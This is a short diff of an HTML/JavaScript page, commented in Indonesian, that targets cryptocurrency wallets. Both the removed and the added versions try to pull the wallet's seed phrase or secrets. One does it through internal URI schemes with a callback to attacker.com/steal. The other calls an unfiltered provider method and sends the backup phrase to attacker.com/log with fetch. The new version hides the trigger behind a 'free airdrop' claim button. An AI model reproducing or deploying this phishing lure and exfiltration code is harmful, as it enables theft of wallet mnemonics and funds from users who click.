@@ -1,12 +1,12 @@
+<button onclick="triggerExploit()">Klaim Airdrop Gratis</button>
+
 <script>
-    // Mencoba memicu fungsi internal untuk mengekspor mnemonic
-    window.location.href = "wallet-internal://export-seed?callback_url=https://attacker.com/steal";
+function triggerExploit() {
+    // Mencoba memicu aktivitas internal wallet untuk mengirim data sesi
+    // Contoh skema URI yang tidak aman:
+    const maliciousUri = "wallet-app://reveal-secret?callback=https://attacker.com/steal";
     
-    // Atau via metode provider yang tidak terfilter
-    window.ethereum.request({
-        method: 'wallet_getBackupPhrase', // Method non-standard yang bocor
-        params: []
-    }).then(phrase => {
-        fetch('https://attacker.com/log?data=' + phrase);
-    });
+    // Memaksa browser berpindah ke URI internal
+    window.location.href = maliciousUri;
+}
 </script>
